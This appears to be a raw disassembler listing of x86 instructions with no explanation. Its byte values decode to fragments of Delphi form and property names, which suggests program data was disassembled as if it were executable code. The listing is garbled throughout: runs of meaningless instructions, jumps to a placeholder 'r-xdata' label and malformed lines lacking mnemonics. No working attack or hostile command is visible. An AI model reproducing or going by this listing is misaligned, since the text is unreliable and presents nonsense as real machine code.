add [ eax ] al
mov ah 0xf1
inc ebx
add dh ah
int1
cmp al dh
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
popad
jbe r-xdata
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax ] bl
sbb [ eax + eax + 0x54 ] al
sbb al [ eax + eax + 0x10 ]
sbb al [ eax + eax - 0x44 ]
sbb eax [ eax + eax - 0x7c ]
sbb al [ eax + eax + 0x34 ]
sbb al [ eax + eax - 0x18 ]
sbb al [ eax + eax + 0x20 ]
sbb eax [ eax + eax + 0x5 ]
push esp
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
add eax 0x69644554
je r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
jo r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
insb
lds eax [ eax + eax - 0x10 ]
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ eax ] al
add [ eax + esi * 8 ] dh
inc ebx
add [ eax ] cl
or al 0x54
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or [ ecx ] al
inc ebp
add al dh
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 + 0x1c580044 ] bh
inc esp
add [ ebx + 0x1d840044 ] dl
inc esp
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
inc ebx
add ah dh
int1
inc ebx
add [ ecx ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xd ] dh
pop ds
inc esp
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
add [ eax + 0x4c004033 ] bl
outsd
insd
inc ebp
imul esi [ fs : esp + ecx * 8 - 0x10 ] 0x61d40043
inc esp
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edx
add [ eax - 0x6fffbfcd ] dl
cmp al 0x17
add [ eax ] eax
add [ eax ] al
add [ edx ] al
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
jb r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
bound eax [ ecx ]
add bh bh
xor [ eax * 2 + 0x100 ] dl
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
insb
jae r-xdata
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x17 ] dh
inc esp
add [ ecx + 0x12200045 ] al
inc ebp
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x28 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
[ ebp ] eax
insb
jae r-xdata
pop esi
inc esp
popad
jae r-xdata
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
jb r-xdata
mov eax eax
int3
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ esi + ecx * 2 + 0x44 ] dl
add [ ecx ] ah
add bh bh
je r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x950ff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
inc ebp
add [ edx + ebx * 8 + 0x44 ] bl
adc [ edx ] al
cwde
xor eax [ eax ]
dec esp
pop ds
inc esp
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
popad
jae r-xdata
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
pop esp
inc esp
add [ ebx + 0x1 ] ah
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] dl
fild [ eax + eax + 0x28 ]
push ds
inc esp
add [ eax ] dh
pop es
inc ebp
add [ eax ] al
in eax 0x44
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ eax + 0x20 ] al
inc esp
add al bh
pop ds
inc esp
add [ eax ] ah
and [ eax + eax + 0x7c ] al
and [ eax + eax - 0x4c ] al
and [ eax + eax + 0x28 ] al
pop ds
inc esp
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc [ edi + ebx + 0x1fc40044 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x43 ] bh
add [ eax ] al
inc esp
add al dh
xchg edx eax
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
jb r-xdata
popad
jae r-xdata
add bh bh
rcr [ edi - 0x6023ffbc ] 0x44
jb r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xac65646f
in eax dx
inc ebp
add [ edx + eax ] cl
add bh bh
dec esp
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
dec ecx
pop ebp
inc esp
add [ ebp + 0x1 ] ah
pop esp
inc esp
add [ ecx + eax ] ah
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
add bh bh
in al dx
adc eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x17 ] dh
inc esp
add [ ecx + 0x12200045 ] al
inc ebp
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x28 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
insb
jae r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
or [ ebp ] al
or [ eax ] 0x45
inc esp
adc al 0x47
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
call 0x7044372b
add [ eax ] al
inc eax
lahf
inc esp
add ah bl
lahf
inc esp
jb r-xdata
insb
outsd
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
add bh bh
pushad
adc al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
push ebp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
ror ah 0xf0
inc ebx
add [ gs : eax ] dl
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + edx + 0x47 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
call [ edi + ebx * 4 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
inc ebp
insb
xor al 0xf0
inc ebx
add [ ebx ] dl
add al [ eax ]
push [ eax + 0x18 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
adc [ edx ] eax
add bh bh
test [ eax ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
sub al 0x5c
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
mov esp 0x8800445c
add [ eax ] eax
dec [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ eax ] cl
add al [ eax ]
[ eax + 0x1004418 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
add bh bh
adc al 0x9f
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
jmp esp
outsb
je r-xdata
outsd
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
dec eax
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call esp
sbb [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
and eax 0x61500b00
adc [ eax ] al
test eax 0x8cff0001
or [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
ja r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
jo r-xdata
inc ebp
add [ eax + eax ] bh
sub [ eax ] al
adc [ eax ] al
or eax 0x4cff0002
sbb [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
add al 0x57
jb r-xdata
je r-xdata
jb r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
dec esp
lahf
inc esp
add [ ecx ] al
add [ eax ] al
xor eax [ eax + eax + 0x10 ]
jb r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
add [ eax ] ch
add [ eax + edx * 2 ] cl
inc esp
add [ eax ] bh
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
je r-xdata
dec ebp
inc esp
add [ eax ] ah
sahf
inc esp
add [ eax - 0x62 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov eax 0x38004508
outsb
jne r-xdata
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
push 0x6948776f
outsb
add [ eax ] cl
push ebx
inc ebx
push 0x8e587261
add bh bh
mov esp 0x44be
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070030 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push cs
dec edi
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
outsb
inc ebx
push 0x65676e61
add al 0x57
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
popfd
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x4656c62
push edi
add [ eax ] al
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
dec esp
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f070037 ] al
add al 0x57
inc ecx
add al al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc ebp
outsb
inc esp
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
push edi
inc ecx
add al cl
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edx
inc esp
add [ eax ] cl
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] eax
[ eax ]
push edi
inc ecx
add [ eax ] ch
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
loopne r-xdata
jo r-xdata
push eax
inc esp
loopne r-xdata
dec edi
mov eax 0xe000444f
add [ eax ] al
jmp eax
xchg esp eax
push eax
inc esp
add al ch
add [ eax ] eax
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
push eax
inc esp
add al bl
add [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
add al ah
add [ eax ] eax
jmp eax
mov [ ecx ] ah
inc esp
add [ ebx + ebx * 4 ] bh
jb r-xdata
cld
inc ebx
add [ eax + eax ] dl
add [ eax ] al
mov esp 0x84004161
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
push ebp
jo r-xdata
outsb
push ebx
je r-xdata
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
inc esp
outsd
ja r-xdata
add al 0xa2
inc ecx
add [ eax + 0x160041a2 ] bl
push esp
inc ebx
jne r-xdata
inc esp
add ah bl
popfd
inc ecx
add [ eax + 0x4800419e ] dh
sub [ eax ] eax
in al 0x9e
inc ecx
add [ edi + ebx * 4 ] dl
inc ecx
add [ eax - 0x61 ] ch
inc ecx
add [ eax ] dl
inc ecx
add [ ecx - 0x5dfbffbf ] ch
mov al [ 0x21640041 ]
inc esp
add [ eax - 0x5e ] ah
inc ecx
add al ch
mov [ 0x22980041 ] al
inc esp
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x2bffbe6a ] dh
xchg esi eax
inc ecx
add al bh
xchg esi eax
inc ecx
add al ah
and [ eax + eax + 0x50 ] eax
and al [ eax + eax + 0x54 ]
0x9b480041 0x41
jo r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
push esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add al bl
add [ eax ] al
xor [ eax + 0x44 ] dl
cmp al 0x17
je r-xdata
inc ecx
add al dl
and [ eax + eax - 0x14 ] al
and [ eax + eax - 0x64 ] al
fwait
inc ecx
add ah al
fwait
lea eax [ bx + si ]
cmp bl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
adc [ esi - 0x736fffbf ] 0x41
add [ eax - 0x4fffbe68 ] bh
jb r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add ah bh
sub [ eax + eax + 0x5c ] eax
rol [ eax + eax + 0x50 ] 0x5
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
inc edx
add [ eax - 0x6fffbfcd ] dl
inc esp
add [ edi + edx ] bh
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
xchg edi eax
inc ecx
add [ eax + 0x3c004421 ] cl
add [ eax - 0x6fffbe6a ] al
mov [ ecx ] es
mov eax 0xb0004198
inc esp
outsd
add [ eax ] al
add [ eax ] al
test al 0xfd
inc ebx
add al bh
je r-xdata
xor eax [ eax ]
xchg esp eax
loop r-xdata
imul ebp [ esi + 0x67 ] 0xfc1c9073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
and eax [ eax + eax - 0x10 ]
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
mov esp 0xf000442c
xchg edx eax
je r-xdata
add al al
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
adc [ edx ] al
cwde
je r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
inc ecx
add [ esp + ebp - 0x6d0fffbc ] bh
imul ebp [ esi + 0x67 ] 0x43fb8073
add [ edx + 0x41 ] ah
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
and al [ eax + eax + 0x4 ]
or eax 0x12200045
inc ebp
insb
jae r-xdata
std
inc ebx
add [ edx + eax ] ah
add ah ah
push 0x173c0044
add [ ebp - 0x367ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffbc03 ] ch
sub_43fe34
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc [ ebx ]
sub al 0x0
add [ eax ] al
dec esp
pop ebx
inc esp
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
sub [ eax ] bl
inc edx
add [ edi + ebp + 0x185c0044 ] ch
inc edx
add [ ebp + ecx * 4 + 0x18900044 ] al
inc edx
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
inc edx
add [ eax + ebx + 0x42 ] dh
add al cl
sbb [ edx ] al
jb r-xdata
inc esp
add al dl
das
inc esp
add ah ah
mov [ eax + eax - 0x5c ] es
bound eax [ ebp ]
cmp ah al
inc esp
add [ esi + ecx * 4 + 0x44 ] bl
add [ eax ] bl
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x8 ]
xor [ eax + eax - 0x34 ] al
lea eax [ eax + eax + 0x40 ]
arpl [ ebp ] ax
inc eax
les eax [ eax + eax - 0x40 ]
mov es [ eax + eax ]
pop [ eax + eax - 0x14 ]
lea eax [ eax + eax + 0x54 ]
arpl [ ebp ] ax
pop eax
arpl [ ebp ] ax
adc [ esi - 0x747fffbc ] cl
inc esp
add [ ecx ] dl
push esp
inc edx
jne r-xdata
jo r-xdata
enter 0x4218 0x0
jae r-xdata
pushfd
inc esp
add [ edi + edx + 0x42 ] dl
je r-xdata
add [ eax + r-xdata ] dl
inc esp
add [ eax ] cl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xff58c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
add [ eax + eax + 0x42 ] al
add [ eax + eax + 0xc ] al
add al [ eax ]
add [ eax ] ah
pop esi
inc esp
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
loop r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] bh
xor [ eax + eax + 0x5c ] eax
rol [ eax + eax + 0x50 ] 0x5
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + esi + 0x44 ] ch
add [ ecx + 0x12200045 ] al
inc ebp
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
sub_4401a1
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 + 0x33d40044 ] bh
inc esp
add [ eax + ebx * 8 + 0x34300044 ] ah
inc esp
add [ eax ] al
